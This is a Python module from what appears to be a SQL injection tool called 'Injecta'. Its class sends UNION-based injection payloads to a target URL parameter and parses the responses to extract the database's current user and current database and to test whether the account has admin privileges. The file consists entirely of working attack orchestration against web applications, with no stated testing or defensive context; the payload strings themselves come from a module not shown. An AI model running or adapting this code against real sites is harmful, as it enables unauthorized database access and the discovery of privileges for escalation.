"""
Injecta — Privilege escalation checks
"""
import re
from typing import Any, Dict, List, Optional
from injecta.enum.extract import build_union_payload, extract_orig_val, MARKER


class PrivilegeEscalation:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "") if payloads else ""

    def _get_params(self, url: str, param: str):
        cols = self.info.get("column_count", 1) if self.info else 1
        pos = self.info.get("data_pos", 1) if self.info else 1
        orig_val = extract_orig_val(url, param)
        return cols, pos, orig_val

    def get_current_user(self, url: str, param: str) -> Optional[str]:
        queries = self.payloads.current_user()
        for q in queries:
            cols, pos, orig_val = self._get_params(url, param)
            payload = build_union_payload(q, cols, pos, MARKER, self.dbms, orig_val)
            try:
                _, resp_text, _ = self.req.test_raw(url, payload, param)
                if resp_text:
                    m = re.search(rf'{re.escape(MARKER)}(.+?){re.escape(MARKER)}', resp_text)
                    if m:
                        return m.group(1).strip()
                    m2 = re.search(r"([\w\-.\\]+@?[\w\-.]+|\w+)", resp_text)
                    if m2:
                        return m2.group(1)
            except:
                continue
        return None

    def current_db(self, url: str, param: str) -> Optional[str]:
        queries = self.payloads.current_db()
        for q in queries:
            cols, pos, orig_val = self._get_params(url, param)
            payload = build_union_payload(q, cols, pos, MARKER, self.dbms, orig_val)
            try:
                _, resp_text, _ = self.req.test_raw(url, payload, param)
                if resp_text:
                    m = re.search(rf'{re.escape(MARKER)}(.+?){re.escape(MARKER)}', resp_text)
                    if m:
                        return m.group(1).strip()
            except:
                continue
        return None

    def check_is_admin(self, url: str, param: str) -> bool:
        queries = self.payloads.is_admin()
        for q in queries:
            cols, pos, orig_val = self._get_params(url, param)
            payload = build_union_payload(q, cols, pos, MARKER, self.dbms, orig_val)
            try:
                _, resp_text, _ = self.req.test_raw(url, payload, param)
                if resp_text:
                    m = re.search(rf'{re.escape(MARKER)}(.+?){re.escape(MARKER)}', resp_text)
                    if m:
                        val = m.group(1).strip()
                        if val in ('1', 'Y', 'y', 'YES', 'yes', 'true', 'TRUE'):
                            return True
            except:
                continue
        return False
